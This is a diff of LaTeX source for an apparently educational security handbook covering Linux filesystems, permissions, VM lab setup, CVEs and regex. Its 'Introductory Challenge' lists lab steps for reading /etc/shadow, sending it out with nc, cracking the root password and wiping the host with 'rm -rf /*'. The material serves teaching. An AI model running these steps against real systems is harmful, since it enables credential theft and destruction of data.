+					# mount -o <option>,<option> -t <type> <file system> <directory>
 				\end{lstlisting}
-				The same options and data will work here as in the fstab, however, the format it different as it is expressed at the CLI. 
+				The same options and data will work here as in the fstab, however, the format it different as it is expressed at the CLI.
 
 			\subsubsection{File System Structure}
-			\begin{quote}%TODO: This is horrid. Find a better way. 
+			\begin{quote}%TODO: This is horrid. Find a better way.
 				\begin{quote}
-				\framebox{\parbox{\dimexpr\linewidth-2\fboxsep-2\fboxrule}{\itshape%
+				\textit{
 				This section is an in-depth discussion on how a Linux filesystem works.
-				Feel free to skip it, as it has little use in working with Linux. 
-				However, it can become important when trying to diagnose issues with it.}}
+				Feel free to skip it, as it has little use in working with Linux.
+				However, it can become important when trying to diagnose issues with it.
+				}
 				\end{quote}
 			\end{quote}
-				
-				The Linux file structure is commonly throught of as a tree. 
-				This makes sense when dealing with the way that users interact with it. 
-				Every directory that exists follows some branch from the ``root'' directory, with files being the ``leaves'' at the end. 
-				However, this understanding only works when one is dealing with the system at the basic user level. 
-				One should understand the concept of inodes and the other building blocks of the structure if they are to administer the system. 
-				
-				Each partition on the computer has its own filesystem. 
-				This can be thought of in the same way as the whole Linux structure, having its own root. 
-				However, this only becomes important when looking at how the devices are specified. 
-				Each file system has a list of inodes that are created when the system is initialised. 
-				This is a limited list (usually 1 or 2 per 8KB) of information about files. 
+
+				The Linux file structure is commonly throught of as a tree.
+				This makes sense when dealing with the way that users interact with it.
+				Every directory that exists follows some branch from the ``root'' directory, with files being the ``leaves'' at the end.
+				However, this understanding only works when one is dealing with the system at the basic user level.
+				One should understand the concept of inodes and the other building blocks of the structure if they are to administer the system.
+
+				Each partition on the computer has its own filesystem.
+				This can be thought of in the same way as the whole Linux structure, having its own root.
+				However, this only becomes important when looking at how the devices are specified.
+				Each file system has a list of inodes that are created when the system is initialised.
+				This is a limited list (usually 1 or 2 per 8KB) of information about files.
 				The information contained is as follows:
 				\begin{itemize}
 					\item Owner and group of the file.
 					\item File type.
 					\item Permissions of the file.
-					\item Date and time of creation. 
+					\item Date and time of creation.
 					\item Last read and change.
-					\item Date and time of inode information changes. 
-					\item Number of links to the file. 
+					\item Date and time of inode information changes.
+					\item Number of links to the file.
 					\item File size.
-					\item Address defining the actual location of the data. 
+					\item Address defining the actual location of the data.
 				\end{itemize}
 
-				As you can see, the file name and its directory is not given in this list. 
-				This is because files in Linux do not by nature have either. 
-				They are created through directories---special files in themselves---that contain lists of files and names. 
-				This is why directories will show up as files with permissions when running ``ls -l''. 
-				It is also why you can see files that you do not have read permissions for, assuming you can read the directory. 
+				As you can see, the file name and its directory is not given in this list.
+				This is because files in Linux do not by nature have either.
+				They are created through directories---special files in themselves---that contain lists of files and names.
+				This is why directories will show up as files with permissions when running ``ls -l''.
+				It is also why you can see files that you do not have read permissions for, assuming you can read the directory.
 
-				Understanding these inodes, and the information held within them can be exceptionally useful for understanding issues with the filesystem. 
-				For example, if you have a large number of small files, you may run out of inodes on the system. 
-				This will lead to commands such as ``du -h'' and ``df -h'' telling you that there is space available, while you get ``filesystem full'' errors when creating files. 
-				In this instance, the command ``df -i'' will tell you how many inodes are available. 
+				Understanding these inodes, and the information held within them can be exceptionally useful for understanding issues with the filesystem.
+				For example, if you have a large number of small files, you may run out of inodes on the system.
+				This will lead to commands such as ``du -h'' and ``df -h'' telling you that there is space available, while you get ``filesystem full'' errors when creating files.
+				In this instance, the command ``df -i'' will tell you how many inodes are available.
 
-				Further to this, understanding what is stored in inodes means that you can think about how that will impact access speeds and disk failure. 
-				SSDs for example, have a limited number of writes. 
-				Writing to the disk each time a file is read (the atime stored in inodes) creates significant wear on the disk. 
-				Mounting with the ``noatime'' option will resolve this and cause the drive to last significantly longer. 
+				Further to this, understanding what is stored in inodes means that you can think about how that will impact access speeds and disk failure.
+				SSDs for example, have a limited number of writes.
+				Writing to the disk each time a file is read (the atime stored in inodes) creates significant wear on the disk.
+				Mounting with the ``noatime'' option will resolve this and cause the drive to last significantly longer.
 
-				A direct implication of inodes is the way that linking works on Linux. 
-				Hard links on the system are files with the same inode as each other. 
-				For all intents and purposes, these are the same file. 
-				However, these cannot work over multiple file systems, as each will have a different file at the same inode. 
-				Due to this, simlinks were created. 
-				These perform the same action as hard links, but have two different inodes. 
-				The first inode---that of the original file---contains the files data. 
-				The second---that of the link---contains the data of the link and the address to the data of the original file. 
-				This means that the links can span over multiple file systems with no issues. 
+				A direct implication of inodes is the way that linking works on Linux.
+				Hard links on the system are files with the same inode as each other.
+				For all intents and purposes, these are the same file.
+				However, these cannot work over multiple file systems, as each will have a different file at the same inode.
+				Due to this, simlinks were created.
+				These perform the same action as hard links, but have two different inodes.
+				The first inode---that of the original file---contains the files data.
+				The second---that of the link---contains the data of the link and the address to the data of the original file.
+				This means that the links can span over multiple file systems with no issues.
 
-				
+
 			\subsubsection{File Permissions}
 			\index{File Permissions}
 				\begin{table}[H]
 					\centering
 				\begin{adjustbox}{max width=1\textwidth}
-					\begin{tabular}{| l | l | l |}
-						\hline
-						\textbf{Letter} & \textbf{Octal} & \textbf{Meaning} \\ \hline
-						- & 0 & Right in this position not granted \\ \hline
-						r & 4 & Read access is granted in this position \\ \hline
-						w & 2 & Write access is granted in this position \\ \hline
-						x & 1 & Execute access is granted in this position \\ \hline
+					\begin{tabular}{l l l }
+						\toprule
+						\textbf{Letter} & \textbf{Octal} & \textbf{Meaning} \\
+						\toprule
+						- & 0 & Right in this position not granted \\
+						r & 4 & Read access is granted in this position \\
+						w & 2 & Write access is granted in this position \\
+						x & 1 & Execute access is granted in this position \\
+						\bottomrule
 					\end{tabular}
 				\end{adjustbox}
 					\caption{UNIX File Permissions Keys}
@@ -462,213 +475,221 @@
 				\end{table}
 				UNIX file permissions are shown in the following format:
 				\begin{center}
-				\begin{tabular}{| c | c | c | c | l |}
-					\hline
-					Directory & User & Group & Other & Extended \\ \hline
-					d or - & rwx or -{}-{}- & rwx or -{}-{}- & rwx or -{}-{}- & . for SELINUX. \\ \hline
+				\begin{tabular}{c c c c l }
+					\toprule
+					\textbf{Directory} & \textbf{User} & \textbf{Group} & \textbf{Other} & \textbf{Extended} \\
+					\toprule
+					d or - & rwx or -{}-{}- & rwx or -{}-{}- & rwx or -{}-{}- & . for SELINUX. \\
+					\bottomrule
 				\end{tabular}
 				\end{center}
 
 
-				When you are working with these, the chmod command is used to change them. 
+				When you are working with these, the chmod command is used to change them.
 				This command uses the following options to choose where to set the flag:
 				\begin{center}
-					\begin{tabular}{| c | l |}
-						\hline
-						\textbf{Code} & \textbf{Description} \\ \hline
-						u & User Permissions \\ \hline
-						g & Group Permissions \\ \hline
-						o & Other Permissions \\ \hline
+					\begin{tabular}{c l }
+						\toprule
+						\textbf{Code} & \textbf{Description} \\
+						\toprule
+						u & User Permissions \\
+						g & Group Permissions \\
+						o & Other Permissions \\
+						\bottomrule
 					\end{tabular}
 				\end{center}
 		\subsection{Linux Challenges}
 			\subsubsection{Introductory Challenge}
-				This session is designed to familiarise you with the Linux command line. 
-				The goal of this is both to show you how the Linux command line works, and some of its pitfalls. 
-				By the end, you will see both a poorly configured permissions system, and a command which when used the wrong way, will destroy a system. 
+				This session is designed to familiarise you with the Linux command line.
+				The goal of this is both to show you how the Linux command line works, and some of its pitfalls.
+				By the end, you will see both a poorly configured permissions system, and a command which when used the wrong way, will destroy a system.
 
-				The reason that this is useful to know is that Linux, while also being an exceptionally useful OS, is also the main OS for Penetration testing tools. 
-				Thus, understanding the Linux command line is quite useful considering that most of these tools are based on this environment. 
+				The reason that this is useful to know is that Linux, while also being an exceptionally useful OS, is also the main OS for Penetration testing tools.
+				Thus, understanding the Linux command line is quite useful considering that most of these tools are based on this environment.
 
-				The following steps will be required to find the flag and wipe the system.  
-	
+				The following steps will be required to find the flag and wipe the system.
+
 				\begin{enumerate}
-					\item Use ``fping'' to check whether the remote host is running and find which IP address it has. 
-						The command for this is ``fping -g XXX.XXX.XXX.0/25''. 
-					\item Use ``SSH to get command line access to the remote host. 
+					\item Use ``fping'' to check whether the remote host is running and find which IP address it has.
+						The command for this is ``fping -g XXX.XXX.XXX.0/25''.
+					\item Use ``SSH to get command line access to the remote host.
 					% Privelage Ex?
-					\item Cat/Less/vim/nano ``/etc/shadow'' and copy the root password to your system. 
+					\item Cat/Less/vim/nano ``/etc/shadow'' and copy the root password to your system.
 						\begin{itemize}
-							\item If you would like to make this more interesting, manually send the file to your system. 
-							\item Set up a nc listener on any high port with ``nc -l -p XXXX > <output file>''. 
-							\item Send the file using ``nc -p XXXX <local host IP> < <input file>''. 
-							\item The file should now be on your machine called ``<output file>''. 
+							\item If you would like to make this more interesting, manually send the file to your system.
+							\item Set up a nc listener on any high port with ``nc -l -p XXXX > <output file>''.
+							\item Send the file using ``nc -p XXXX <local host IP> < <input file>''.
+							\item The file should now be on your machine called ``<output file>''.
 						\end{itemize}
-					\item Open Johnny and tell it to use the file that you created in the last step. 
-					\item switch user to the root account using ``su root'' and the password that Johnny gave you.  
-					\item Run the command ``rm -rf /* ''. 
-					\item You have now successfully wiped the remote host. 
+					\item Open Johnny and tell it to use the file that you created in the last step.
+					\item switch user to the root account using ``su root'' and the password that Johnny gave you.
+					\item Run the command ``rm -rf /* ''.
+					\item You have now successfully wiped the remote host.
 				\end{enumerate}
 			\subsubsection{Setting up a VM and installing Kali Rolling}
-				This session will teach you both how to set up a VM in VMware Workstation and install and configure Kali Rolling within it. 
-				This will be important to you as it is your main means of security to ensure that you are not attacking a target that you shouldn't be. 
-				With properly configured VMs and virtual networks, 
-				you cannot attack the wrong target, but without them, 
-				a single mistype and you could be attacking a completely different target. 
-				
-				To Set up a VM correctly, the following items must be set. 
-				Where a setting can be relaxed, it has been noted, along with when. 
+				This session will teach you both how to set up a VM in VMware Workstation and install and configure Kali Rolling within it.
+				This will be important to you as it is your main means of security to ensure that you are not attacking a target that you shouldn't be.
+				With properly configured VMs and virtual networks,
+				you cannot attack the wrong target, but without them,
+				a single mistype and you could be attacking a completely different target.
+
+				To Set up a VM correctly, the following items must be set.
+				Where a setting can be relaxed, it has been noted, along with when.
 				\begin{itemize}
-					\item Shared Folders should be disabled unless to send a specific file. 
-						Generally, this is not useful and provides a good way to get access to the host. 
-					\item Processors: Generally as many cores as possible. However, 2 should suffice, 4 is the minimum for good performance. 
-					\item Memory: Should be set to minimum 4GB. 
-					\item Display: Turn on accelerated graphics and pass through memory. 
+					\item Shared Folders should be disabled unless to send a specific file.
+						Generally, this is not useful and provides a good way to get access to the host.
+					\item Processors: Generally as many cores as possible. However, 2 should suffice, 4 is the minimum for good performance.
+					\item Memory: Should be set to minimum 4GB.
+					\item Display: Turn on accelerated graphics and pass through memory.
 					\item Network:
 						\begin{itemize}
-							\item When working the VM should be set to a custom host only network. 
-							\item This will stop any traffic getting out of your lab, as well as helping to stop any malicious traffic reaching the host. 
-							\item Between practices, such as when updating tools, NAT will allow you to connect to the internet. 
-							\item However, \emph{do not forget to reset to host only} after updating. 
-							\item No matter the setup, you will likely want to set ``Use Local DHCP Service'' to enable you to get an IP address rather than setting them all manually. 
-							\item When dealing with software that you do not trust, you should also uncheck the ``Connect a host virtual adaptor to this network'' so that the software cannot access the physical host over the network. 
+							\item When working the VM should be set to a custom host only network.
+							\item This will stop any traffic getting out of your lab, as well as helping to stop any malicious traffic reaching the host.
+							\item Between practices, such as when updating tools, NAT will allow you to connect to the internet.
+							\item However, \emph{do not forget to reset to host only} after updating.
+							\item No matter the setup, you will likely want to set ``Use Local DHCP Service'' to enable you to get an IP address rather than setting them all manually.
+							\item When dealing with software that you do not trust, you should also uncheck the ``Connect a host virtual adaptor to this network'' so that the software cannot access the physical host over the network.
 						\end{itemize}
-					\item Hard disk: Usually 20GB is fine for basic Linux installs. 
-						Windows usually requires more. 
-					\item USB: Ensure that you have a USB controller connected. 
-						This is your easiest way to get hardware level access. 
-					\item Unless you have a server, set compatibility level to 12. 
-					\item Isolation: When working, disable both copy and paste and drag and drop. 
-						When updating or setting up, feel free to enable them. 
-						This is to protect the host system, not to stop attacks leaking. 
-					\item Ensure that VNC and other remote connections are disabled. 
+					\item Hard disk: Usually 20GB is fine for basic Linux installs.
+						Windows usually requires more.
+					\item USB: Ensure that you have a USB controller connected.
+						This is your easiest way to get hardware level access.
+					\item Unless you have a server, set compatibility level to 12.
+					\item Isolation: When working, disable both copy and paste and drag and drop.
+						When updating or setting up, feel free to enable them.
+						This is to protect the host system, not to stop attacks leaking.
+					\item Ensure that VNC and other remote connections are disabled.
 				\end{itemize}
 	\section{The CVE System}
 	\index{CVE}
 		The Common Vulnerability and Exposure system is a dictionary of publicly known security vulnerabilities\footnote{\url{https://cve.mitre.org/}}
-		This system was created to enable data exchange between security products and provide a base line index point for evaluating coverage for those tools. 
-		However, it has now become the standard for releasing a vulnerability and for determining exactly what attack was launched. 
+		This system was created to enable data exchange between security products and provide a base line index point for evaluating coverage for those tools.
+		However, it has now become the standard for releasing a vulnerability and for determining exactly what attack was launched.
 
-		This system allocates a unique CVE-ID to each vulnerability or exposure that is publicly released through them. 
-		This is usually done early on in the investigation, as the organisation will not release the information until the vulnerability is made public. 
-		However, due to this, the CVE list may be out of date by a factor of years in some areas. 
+		This system allocates a unique CVE-ID to each vulnerability or exposure that is publicly released through them.
+		This is usually done early on in the investigation, as the organisation will not release the information until the vulnerability is made public.
+		However, due to this, the CVE list may be out of date by a factor of years in some areas.
 
-		These numbers are then used in all correspondence and publications of the vulnerability, leading to them becoming a search tool for that particular release. 
-		This means that if you are searching for information about a particular vulnerability, finding the CVE that goes with it will likely lead to finding multiple releases about it. 
-		Furthermore, exploits an exploit kits usually note the CVE that they target, allowing you to search them by the given CVE. 
-		This is also the case with tools such as Nessus, which gives all relevant CVEs for any of its scan responses. 
+		These numbers are then used in all correspondence and publications of the vulnerability, leading to them becoming a search tool for that particular release.
+		This means that if you are searching for information about a particular vulnerability, finding the CVE that goes with it will likely lead to finding multiple releases about it.
+		Furthermore, exploits an exploit kits usually note the CVE that they target, allowing you to search them by the given CVE.
+		This is also the case with tools such as Nessus, which gives all relevant CVEs for any of its scan responses.
 
-		
+
 	\section{Regex}
 	\index{Regex}
-		Regular Expressions, hereby shortened to regex, are a means of expressing a variable set of characters succinctly. 
-		Similar to mathematics, where there are a number of symbols with specific meanings, 
-		regex treats each character within it as having a specific meaning and reason\cite{regexTHW}. 
+		Regular Expressions, hereby shortened to regex, are a means of expressing a variable set of characters succinctly.
+		Similar to mathematics, where there are a number of symbols with specific meanings,
+		regex treats each character within it as having a specific meaning and reason\cite{regexTHW}.
 
-		It is worth noting that while this is exceptionally useful, it does have its constraints. 
-		Generally, it will be better to create multiple small expressions and programmatically join them together. 
+		It is worth noting that while this is exceptionally useful, it does have its constraints.
+		Generally, it will be better to create multiple small expressions and programmatically join them together.
 		The alternative often becomes unmanageable\footnote{\url{http://www.ex-parrot.com/pdw/Mail-RFC822-Address.html}}.
 
 		\subsection{Basic regex}
-			One of the most basic concepts of regex is that of character sets\footnote{\url{http://neverfear.org/blog/view/12/Regex\_tutorial\_for\_people\_who\_should\_know\_Regex\_\_but\_do\_not\_\_\_Part\_1}}. 
-			If you can order characters, you can create a range out of them to use. 
-			For example, ``[a-z]'' will match all lower case characters. 
-			Similarly, ``[0-1]'' will match binary only.  
+			One of the most basic concepts of regex is that of character sets\footnote{\url{http://neverfear.org/blog/view/12/Regex\_tutorial\_for\_people\_who\_should\_know\_Regex\_\_but\_do\_not\_\_\_Part\_1}}.
+			If you can order characters, you can create a range out of them to use.
+			For example, ``[a-z]'' will match all lower case characters.
+			Similarly, ``[0-1]'' will match binary only.
 
-			We can make further use of this by adding a length value to these. 
-			This will capture $x$ number of characters found within the range specified. 
-			For example, ``[0-1]\{8\}'' will match exactly one byte of binary. 
-			
-			These sets can also be strung together. 
-			If we knew we wanted a string of 10 characters, uppercase, lowercase or numeric, we could use ``[a-zA-Z0-9]\{10\}''. 
-			One could also use ``\{10,12\}'' to designate between 10 and 12 characters. 
+			We can make further use of this by adding a length value to these.
+			This will capture $x$ number of characters found within the range specified.
+			For example, ``[0-1]\{8\}'' will match exactly one byte of binary.
 
-			Finally, you need not use these character sets for everything. 
-			If you know you have a specific string, but not what comes after it, you could use ``string[0-9]\{5\}''. 
+			These sets can also be strung together.
+			If we knew we wanted a string of 10 characters, uppercase, lowercase or numeric, we could use ``[a-zA-Z0-9]\{10\}''.
+			One could also use ``\{10,12\}'' to designate between 10 and 12 characters.
+
+			Finally, you need not use these character sets for everything.
+			If you know you have a specific string, but not what comes after it, you could use ``string[0-9]\{5\}''.
 		\subsection{Number of Characters}
-			While so far we have been explicit about the number of characters to match. 
-			However, we will often not know this, or will have a large variance. 
+			While so far we have been explicit about the number of characters to match.
+			However, we will often not know this, or will have a large variance.
 			Thus, special characters have been implemented to allow for this.
-			Table \ref{tab:numberOfCharacters} contains the symbols used to implement this. 
+			Table \ref{tab:numberOfCharacters} contains the symbols used to implement this.
 
 			\begin{table}[htb]
 				\centering
-				\begin{tabular}{|l|l|}
-					\hline
-					\textbf{Character} & \textbf{Description} \\ \hline
-					? & Zero or one of the characters. \\ \hline
-					+ & One or more of the characters. \\ \hline
-					* & Zero or more of the characters. \\ \hline
+				\begin{tabular}{ll}
+					\toprule
+					\textbf{Character} & \textbf{Description} \\
+					\toprule
+					? & Zero or one of the characters. \\
+					+ & One or more of the characters. \\
+					* & Zero or more of the characters. \\
+					\bottomrule
 				\end{tabular}
 				\caption{Wildcards for Matching Multiple Characters}
 				\label{tab:numberOfCharacters}
 			\end{table}
-			This for example is useful for matching pluralisation such as ``word[s]?''. 
-			Similarly, we could check for questions using ``[?]+''. 
+			This for example is useful for matching pluralisation such as ``word[s]?''.
+			Similarly, we could check for questions using ``[?]+''.
 
 		\subsection{Groups}
-			Groups are used when you have a small piece of variable data near a constant piece that you don't need. 
-			An example of this is a movie time, which is usually shown as ``screening: <time>''. 
+			Groups are used when you have a small piece of variable data near a constant piece that you don't need.
+			An example of this is a movie time, which is usually shown as ``screening: <time>''.
 			Using this example, the following regex would return the time: ``screening: ([\textbackslash{}w]*)''.
 		\subsection{Anchors}
-			Anchors are used to ensure that you are matching a string in the correct place\footnote{\url{http://www.rexegg.com/regex-anchors.html}}. 
-			For example, you could want to match only numeric strings which start with a number at the start of the line, 
+			Anchors are used to ensure that you are matching a string in the correct place\footnote{\url{http://www.rexegg.com/regex-anchors.html}}.
+			For example, you could want to match only numeric strings which start with a number at the start of the line,
 			you could use ``\^{}[d]+''.
-			The major anchors are `\^{}' for start of line and `\$' for its end. 
-			There are other more minor anchors, such as `\textbackslash{}A' and `\textbackslash{}Z' which match the start or end of a string respectively. 
-			These can be exceptionally useful, as they allow you to match an explicit part of the line or string. 
+			The major anchors are `\^{}' for start of line and `\$' for its end.
+			There are other more minor anchors, such as `\textbackslash{}A' and `\textbackslash{}Z' which match the start or end of a string respectively.
+			These can be exceptionally useful, as they allow you to match an explicit part of the line or string.
 		\subsection{Shortcuts}
-			Rather than typing full sequences each time, there are a number of shortcuts which can be used. 
+			Rather than typing full sequences each time, there are a number of shortcuts which can be used.
 			These generally also help to make the expression more readable, but do not always work (it is based on OS and implementation).
-			The table \ref{tab:regexShortcuts} contains a list of the main shortcuts available in regex. 
+			The table \ref{tab:regexShortcuts} contains a list of the main shortcuts available in regex.
 			\begin{table}[htb]
 				\centering
-				\begin{tabular}{|l|l|}
-					\hline
-					\textbf{Shortcut} & \textbf{Description} \\ \hline
-					A & Matches upper and lower case alphabet. Same as ``[a-zA-Z]''. \\ \hline
-					S & Matches white-space, including tabs. \\ \hline
-					w & Matches alphanumeric. Same as ``[a-zA-Z0-9]''. \\ \hline
-					W & Matches the opposite of w. \\ \hline 
-					. & Matches any character. \\ \hline
-					d & Matches numbers. Same as ``[0-9]''. \\ \hline
-					D & Matches the opposite of d. \\ \hline
+				\begin{tabular}{ll}
+					\toprule
+					\textbf{Shortcut} & \textbf{Description} \\
+					\toprule
+					A & Matches upper and lower case alphabet. Same as ``[a-zA-Z]''. \\
+					S & Matches white-space, including tabs. \\
+					w & Matches alphanumeric. Same as ``[a-zA-Z0-9]''. \\
+					W & Matches the opposite of w. \\
+					. & Matches any character. \\
+					d & Matches numbers. Same as ``[0-9]''. \\
+					D & Matches the opposite of d. \\
+					\bottomrule
 				\end{tabular}
 				\caption{Shortcut Sequences in Regex}
 				\label{tab:regexShortcuts}
 			\end{table}
 		\subsection{Escaping}
-			Regex is a symbolic language. 
-			This means that some symbols have specific meanings. 
-			However, occasionally, we just want to use them as the symbol they are. 
+			Regex is a symbolic language.
+			This means that some symbols have specific meanings.
+			However, occasionally, we just want to use them as the symbol they are.
 			For example, what if we want to find a value in dollars?
-			Using ``\$[d]+'' obviously wouldn't work for this, as it will find numbers after the end of a line. 
+			Using ``\$[d]+'' obviously wouldn't work for this, as it will find numbers after the end of a line.
 			However, we can escape characters to ensure that regex reads the `\$' as just that:
 			``\textbackslash\$[d]+''\footnote{\url{https://xkcd.com/1638/}}.
 		\subsection{Tools}
-			There are a number of tools that rely on regex to work. 
-			You have quite likely already been using some of them without the regex aspect. 
-			Including it now will give you far more control of the files you are editing with them. 
+			There are a number of tools that rely on regex to work.
+			You have quite likely already been using some of them without the regex aspect.
+			Including it now will give you far more control of the files you are editing with them.
 
 			\subsubsection{grep}
-				This is the general string parser for UNIX systems. 
-				To date, you have likely been using it by piping data into it and giving it a search term. 
-				However, it will also search using regex, and can do so for whole files or folders. 
+				This is the general string parser for UNIX systems.
+				To date, you have likely been using it by piping data into it and giving it a search term.
+				However, it will also search using regex, and can do so for whole files or folders.
 				For example, in my source for this document, the following will find all displayed equasions:
 				\begin{lstlisting}[style=CLI]
 					$ grep -e $\$\$ tex/*
 				\end{lstlisting}
 			\subsubsection{Sed}
-				Sed is a stream editor, it is designed to take input and apply a rule to it to change the content. 
-				This makes it exceptionally useful for editing files in bulk for similar changes. 
+				Sed is a stream editor, it is designed to take input and apply a rule to it to change the content.
+				This makes it exceptionally useful for editing files in bulk for similar changes.
 				Following the examples based on the source code for this book, the following was used in it's early stages to change from using chapters, to using sections (a change that I quickly undid):
 				\begin{lstlisting}[style=CLI]
 					$ sed s:section:subsection:g -i .bac *.tex
 					$ sed s:chapter:section: -i .bac *.tex
-				\end{lstlisting} %TODO: Make this use regex specifically. 
+				\end{lstlisting} %TODO: Make this use regex specifically.
 			\subsubsection{Vim}
-				While I am specifically discussing Vim, there most other editors on Linux or BSD will allow you to use regex. 
-				For Vim, there are a number of commands which give you interactive access to functions similar to those discussed above for sed and grep. 
+				While I am specifically discussing Vim, there most other editors on Linux or BSD will allow you to use regex.
+				For Vim, there are a number of commands which give you interactive access to functions similar to those discussed above for sed and grep.
 				For example, grep-like searches of the currently open file can be initiated using ``/''
 				Furthermore, sed like find and replace is done using only slight alterations to the syntax:
 				\begin{lstlisting}[numbers=none]
